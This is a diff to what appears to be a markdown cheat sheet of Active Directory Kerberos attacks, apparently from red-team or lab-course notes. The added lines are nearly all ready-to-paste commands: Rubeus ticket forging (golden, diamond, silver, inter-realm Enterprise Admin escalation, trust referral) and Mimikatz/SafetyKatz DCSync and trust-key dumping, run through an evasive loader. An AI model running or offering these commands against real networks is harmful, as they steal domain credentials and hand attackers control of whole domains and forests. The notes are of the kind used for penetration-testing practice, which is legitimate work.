@@ -22,10 +22,13 @@ permalink: /creds/krb
 	* [diamond](#diamond)
 	* [golden](#golden)
 	* [silver](#silver)
+	* [silver-ea](#silver-ea)
+	* [referral](#referral)
 * [dump](#dump)
 	* [vault](#vault)
 	* [lsadump-lsa](#lsadump-lsa)
 	* [lsadump-dcsync](#lsadump-dcsync)
+	* [lsadump-trust](#lsadump-trust)
 * [manipulate](#manipulate)
 	* [cleartext-2-nthash](#cleartext-2-nthash)
 	* [ccache-convert](#ccache-convert)
@@ -131,6 +134,9 @@ C:\Users\Public\SafetyKatz.exe %Pwn% exit
 
 ### <a name='tgt'></a>tgt
 ```powershell
+# inter-realm TGT / ZDOM TO ZFOREST
+.\Loader.exe -path .\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:${zdom_fqdn} /sid:${zdom_sid} /sids:${zea_sid} /aes256:${zdom_krbtgt_aes256k} /netbios:${znbss} /ptt
+
 # TO TEST
 #cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_dc_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv
 #cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_computer_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv
@@ -143,8 +149,11 @@ C:\Users\Public\SafetyKatz.exe %Pwn% exit
 
 * TGT modification, avoid detection of forged TGT without PREAUTH 
 * requires the KRBTGT$ account hash
+* [+] Process : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
 
 ```powershell
+#$zdom_krbtgt_aes256k=""
+C:\Users\Public\Loader.exe -path .\Rubeus.exe -args diamond /krbkey:${zdom_krbtgt_aes256k} /tgtdeleg /enctype:aes /ticketuser:administrator /domain:${zdom_fqdn} /dc:${zdom_dc_fqdn} /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
 ### <a name='golden'></a>golden
@@ -155,9 +164,10 @@ C:\Users\Public\SafetyKatz.exe %Pwn% exit
 ```powershell
 #$zdom_krbtgt_aes256k=""
 #$zdom_krbtgt_norid=""
-C:\Users\Public\Loader.exe -path .\Rubeus.exe -args evasive-golden /aes256:$zdom_krbtgt_aes256k /sid:$zdom_krbtgt_norid /ldap /user:Administrator /printcmd
-#
-C:\Users\Public\Loader.exe -path .\Rubeus.exe -args evasive-golden /aes256:$zdom_krbtgt_aes256k /user:Administrator /id:500 /pgid:513 /domain:$zdom_fqdn /sid:$zdom_krb_norid /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:$zdom_dc_fqdn /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
+# 01 # CMD TO RUN
+C:\Users\Public\Loader.exe -path .\Rubeus.exe -args evasive-golden /aes256:${zdom_krbtgt_aes256k} /sid:${zdom_krbtgt_norid} /ldap /user:Administrator /printcmd
+# 02 # BUILT CMD TO COPY/PASTE
+C:\Users\Public\Loader.exe -path .\Rubeus.exe -args evasive-golden /aes256:${zdom_krbtgt_aes256k} /user:Administrator /id:500 /pgid:513 /domain:${zdom_fqdn} /sid:${zdom_krbtgt_norid} /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:152 /netbios:dcorp /groups:544,512,520,513 /dc:${zdom_dc_fqdn} /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
 ```
 
 ### <a name='silver'></a>silver
@@ -165,6 +175,23 @@ C:\Users\Public\Loader.exe -path .\Rubeus.exe -args evasive-golden /aes256:$zdom
 * service account hash required to forgort a TGS
 * it is mostly the machine account hash, valid for 30 days by default
 * more silent than the golden ticket, no kerberos interaction with the DC (aka no AS-REQ, TGS-REQ)
+* SPN service can be change by any valid one, not restricted to msds-AllowedToDelegateTo
+
+```powershell
+# SILVER TICKET AS Domain Admin (DA)
+#$zdom_krbtgt_aes256k=""
+#$zdom_krbtgt_norid=""
+C:\Users\Public\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/${zdom_dc_fqdn} /aes256:${zdom_krbtgt_aes256k} /sid:${zdom_krbtgt_norid} /ldap /user:Administrator /domain:${zdom_fqdn} /ptt
+```
+
+### <a name='silver-ea'></a>silver-ea
+```powershell
+# 01 # forge a silver ticket AS Enterprise Administrator (EA) 
+C:\AD\Tools>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/${zdom_fqdn} /rc4:${zforest_krbtgt_nthash} /sid:${zdom_sid} /sids:${zea_sid}-519 /ldap /user:Administrator /nowrap
+
+# 02 # import the ticket
+.\Loader.exe -path .\Rubeus.exe -args asktgs /service:http/${zforest_dc_fqdn} /dc:${zforest_dc_fqdn} /ptt /ticket:doIFX...==
+```
 
 | Service Type 				| 	Service Silver Tickets 	|
 |---------------------------|---------------------------|
@@ -175,12 +202,18 @@ C:\Users\Public\Loader.exe -path .\Rubeus.exe -args evasive-golden /aes256:$zdom
 | Windows File Share (CIFS) | CIFS 						|
 | LDAP operations (DCSync)  | LDAP 						|	
 | Windows RSAT 				| RPCSS LDAP CIFS 			|	
+| Windows RSAT 				| RPCSS LDAP CIFS 			|	
 
 
+### <a name='referral'></a>referral
 ```powershell
-#$zdom_krbtgt_aes256k=""
-#$zdom_krbtgt_norid=""
-C:\Users\Public\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/${zdom_dc_fqdn} /aes256:${zdom_krbtgt_aes256k} /sid:${zdom_krbtgt_norid} /ldap /user:Administrator /domain:${zdom_fqdn} /ptt
+# 01 #
+#$zdom_sid
+#$zdom_trustk
+.\Loader.exe -path .\Rubeus.exe -args evasive-silver /service:krbtgt/${zdom_fqdn} /rc4:${zdom_trustk} /sid:${zdom_sid} /ldap /user:Administrator /nowrap
+
+# 02 # import the ticket 
+.\Loader.exe -path .\Rubeus.exe -args asktgs /service:cifs/${zdom_dc_fqdn} /dc:${zdom_dc_fqdn} /ptt /ticket:doIFX...==
 ```
 
 ## <a name='dump'></a>dump
@@ -197,11 +230,24 @@ Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
 Invoke-Mimi -Command '"token::elevate" "lsadump::lsa /patch"'
 Invoke-Mimi -Command '"token::elevate" "sekurlsa::evasive-keys /patch"'
 ```
+
 ### <a name='lsadump-dcsync'></a>lsadump-dcsync
 ```powershell
 # dcsync
+#$znbss=""
+#$ztarg_user_name="krbtgt"
+#$zx=$znbss+"\"+$ztarg_user_name
+.\Loader.exe -path .\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:${zx}" "exit"
 Invoke-Mimi -Command '"token::elevate" "lsadump::dcsync"'
 ```
+
+### <a name='lsadump-trust'></a>lsadump-trust
+```powershell
+# dump the krbtgt of the forest
+.\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
+```
+
+
 
 ## <a name='manipulate'></a>manipulate
 
